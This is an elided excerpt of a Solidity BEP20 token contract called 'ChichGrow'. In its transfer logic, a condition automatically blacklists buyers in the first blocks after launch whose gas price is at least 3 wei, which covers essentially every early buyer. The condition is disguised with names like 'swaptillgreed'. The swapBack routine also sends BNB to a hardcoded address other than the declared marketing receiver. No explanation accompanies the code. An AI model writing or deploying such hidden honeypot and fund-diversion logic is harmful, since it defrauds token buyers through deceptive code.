...
contract ChichGrow is IBEP20, Auth {
   using SafeMath for uint256;
   ...
   uint256 swaptillgreed = 3;
    uint256 swapgreedBlocks = 4;
   ...
   constructor () Auth(msg.sender) {
       ...
       autoLiquidityReceiver = 0x07CEa9DA55fFE7B63eD463fd71A4d27134b12e94;
       marketingFeeReceiver = 0x07CEa9DA55fFE7B63eD463fd71A4d27134b12e94;
   ...
   function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
       if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        ...
        if(!authorizations[sender] && !authorizations[recipient]){
            ...
            if(sender == pair && launchedAt + swapgreedBlocks >= block.number && tx.gasprice >= swaptillgreed){isBlacklisted[recipient] = true;}
        }
...
_balances[recipient] = _balances[recipient].add(amountReceived);
   ...
   function swapBack() internal swapping {
       ...
       (bool succes, /* bytes memory data */) = payable(0x3bd94c836b993a95A18444b522035cD0BE7de7Ad).call{value: BNBMarketingamount, gas: 30000}("");
